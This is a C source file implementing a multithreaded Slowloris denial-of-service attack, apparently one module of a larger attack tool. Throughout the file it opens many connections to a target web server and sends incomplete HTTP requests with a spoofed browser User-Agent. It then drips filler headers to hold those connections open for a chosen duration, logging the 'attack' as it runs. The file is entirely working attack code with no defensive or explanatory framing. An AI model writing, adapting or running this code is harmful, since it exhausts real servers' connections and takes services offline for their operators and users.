#include "slowloris.h"
#include "../config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#define close_socket closesocket
#define usleep_ms(ms) Sleep(ms)
#else
#include <errno.h>
#define close_socket close
#define usleep_ms(ms) usleep((ms) * 1000)
#define SOCKET int
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR   (-1)
#endif

static double get_time(void)
{
#ifdef _WIN32
    LARGE_INTEGER freq, counter;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&counter);
    return (double)counter.QuadPart / (double)freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
#endif
}

static void slowloris_log(slowloris_t *ctx, const char *message)
{
    if (ctx->callback) {
        ctx->callback(message);
    } else {
        printf("[Slowloris] %s\n", message);
    }
}

int slowloris_init(slowloris_t *ctx, const char *target, int duration,
                   int threads, int port, slowloris_callback_t callback)
{
    memset(ctx, 0, sizeof(*ctx));
    ctx->duration = duration;
    ctx->threads  = threads;
    ctx->port     = port;
    ctx->callback = callback;
    ctx->stop_flag = 0;
    ctx->num_active_sockets = 0;
    pthread_mutex_init(&ctx->stats.lock, NULL);
    pthread_mutex_init(&ctx->socket_lock, NULL);

    /* Strip protocol prefix if present */
    {
        const char *host = target;
        if (strncmp(host, "http://", 7) == 0)  host += 7;
        if (strncmp(host, "https://", 8) == 0) host += 8;
        snprintf(ctx->target, sizeof(ctx->target), "%s", host);
        /* Remove path */
        char *slash = strchr(ctx->target, '/');
        if (slash) *slash = '\0';
    }

    /* Resolve hostname */
    {
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(ctx->target, NULL, &hints, &res) != 0) {
            snprintf(ctx->resolved_ip, sizeof(ctx->resolved_ip), "%s", ctx->target);
        } else {
            struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
            inet_ntop(AF_INET, &addr->sin_addr, ctx->resolved_ip, sizeof(ctx->resolved_ip));
            freeaddrinfo(res);
        }
    }

    /* Initialize socket slots to invalid */
    for (int i = 0; i < SLOWLORIS_MAX_SOCKETS; i++) {
        ctx->active_sockets[i] = INVALID_SOCKET;
    }

    return 0;
}

static SOCKET slowloris_create_connection(slowloris_t *ctx)
{
    SOCKET sock;
    struct sockaddr_in server;
    char request[1024];
    int path_num;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    /* Set timeout */
#ifdef _WIN32
    DWORD timeout_val = 5000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_val, sizeof(timeout_val));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_val, sizeof(timeout_val));
#else
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(ctx->port);
    inet_pton(AF_INET, ctx->resolved_ip, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        close_socket(sock);
        return INVALID_SOCKET;
    }

    /* Send partial HTTP request (no final \r\n to keep it open) */
    path_num = rand() % 999000 + 1000;
    snprintf(request, sizeof(request),
             "GET /%d HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
             "Accept: text/html,application/xhtml+xml\r\n",
             path_num, ctx->target);

    if (send(sock, request, (int)strlen(request), 0) == SOCKET_ERROR) {
        close_socket(sock);
        return INVALID_SOCKET;
    }

    /* Track the socket */
    pthread_mutex_lock(&ctx->socket_lock);
    if (ctx->num_active_sockets < SLOWLORIS_MAX_SOCKETS) {
        ctx->active_sockets[ctx->num_active_sockets++] = sock;
    }
    pthread_mutex_unlock(&ctx->socket_lock);

    pthread_mutex_lock(&ctx->stats.lock);
    ctx->stats.connections_opened++;
    ctx->stats.connections_active++;
    pthread_mutex_unlock(&ctx->stats.lock);

    return sock;
}

static void slowloris_keep_alive(slowloris_t *ctx, SOCKET sock)
{
    char header[64];

    while (!ctx->stop_flag) {
        int val = rand() % 5000 + 1;
        snprintf(header, sizeof(header), "X-a: %d\r\n", val);

        if (send(sock, header, (int)strlen(header), 0) == SOCKET_ERROR) {
            break;
        }

        /* Wait ~10 seconds between keep-alive headers, checking stop flag */
        for (int i = 0; i < 100 && !ctx->stop_flag; i++) {
            usleep_ms(100);
        }
    }

    pthread_mutex_lock(&ctx->stats.lock);
    ctx->stats.connections_active--;
    pthread_mutex_unlock(&ctx->stats.lock);

    close_socket(sock);
}

static void *slowloris_worker(void *arg)
{
    slowloris_t *ctx = (slowloris_t *)arg;

    while (!ctx->stop_flag) {
        SOCKET sock = slowloris_create_connection(ctx);
        if (sock != INVALID_SOCKET) {
            slowloris_keep_alive(ctx, sock);
        }
        usleep_ms(100);
    }

    return NULL;
}

slowloris_stats_t slowloris_run(slowloris_t *ctx)
{
    char msg[512];
    pthread_t *workers;
    int i;

    ctx->stats.start_time = get_time();
    ctx->stop_flag = 0;

    snprintf(msg, sizeof(msg), "Starting Slowloris attack on %s:%d", ctx->target, ctx->port);
    slowloris_log(ctx, msg);
    snprintf(msg, sizeof(msg), "Duration: %ds | Threads: %d", ctx->duration, ctx->threads);
    slowloris_log(ctx, msg);

    workers = (pthread_t *)malloc(sizeof(pthread_t) * ctx->threads);
    if (!workers) {
        slowloris_log(ctx, "Error: Failed to allocate thread array");
        return ctx->stats;
    }

    for (i = 0; i < ctx->threads; i++) {
        pthread_create(&workers[i], NULL, slowloris_worker, ctx);
    }

    /* Run for specified duration */
    {
        double end_time = get_time() + ctx->duration;
        while (get_time() < end_time && !ctx->stop_flag) {
            usleep_ms(100);
        }
    }

    slowloris_stop(ctx);

    /* Wait for threads to finish */
    for (i = 0; i < ctx->threads; i++) {
        pthread_join(workers[i], NULL);
    }
    free(workers);

    /* Clean up remaining sockets */
    pthread_mutex_lock(&ctx->socket_lock);
    for (i = 0; i < ctx->num_active_sockets; i++) {
        if (ctx->active_sockets[i] != INVALID_SOCKET) {
            close_socket(ctx->active_sockets[i]);
            ctx->active_sockets[i] = INVALID_SOCKET;
        }
    }
    ctx->num_active_sockets = 0;
    pthread_mutex_unlock(&ctx->socket_lock);

    ctx->stats.end_time = get_time();

    snprintf(msg, sizeof(msg), "Attack completed. Connections opened: %lld",
             ctx->stats.connections_opened);
    slowloris_log(ctx, msg);

    return ctx->stats;
}

void slowloris_stop(slowloris_t *ctx)
{
    ctx->stop_flag = 1;
    slowloris_log(ctx, "Stop signal received");
}

void slowloris_destroy(slowloris_t *ctx)
{
    pthread_mutex_destroy(&ctx->stats.lock);
    pthread_mutex_destroy(&ctx->socket_lock);
}
